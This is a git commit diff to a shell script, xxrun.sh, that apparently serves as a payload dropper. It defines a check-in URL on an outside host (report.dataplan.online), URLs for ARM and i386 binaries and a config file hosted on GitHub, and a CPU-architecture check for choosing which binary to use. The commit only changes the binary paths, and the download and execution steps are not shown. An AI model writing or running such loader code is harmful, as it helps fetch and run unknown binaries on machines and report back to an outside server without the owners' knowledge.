06d3db4d05337a3f337c6b54e9a3ac4e3cdee22e
gptloveyou <129956509+gptloveyou@users.noreply.github.com>
2023-04-19 17:56:31 +0000

    Update xxrun.sh

--- xxrun.sh
+++ xxrun.sh
@@ -1,8 +1,8 @@
 #!/bin/sh
 
 report_url="http://report.dataplan.online:19288/9024134B28978B68666E2B034E46130E/debug"
-arm_url="https://raw.githubusercontent.com/gptloveyou/001/main/armv5.bin"
-intel_url="https://raw.githubusercontent.com/gptloveyou/001/main/i386.bin"
+arm_url="https://raw.githubusercontent.com/gptloveyou/001/main/bin/arm.bin"
+intel_url="https://raw.githubusercontent.com/gptloveyou/001/main/bin/i386.bin"
 config_url="https://raw.githubusercontent.com/gptloveyou/001/main/config.json"
 pl_url=$intel_url;
 arch=`cat /proc/cpuinfo|grep -i -c ARM`
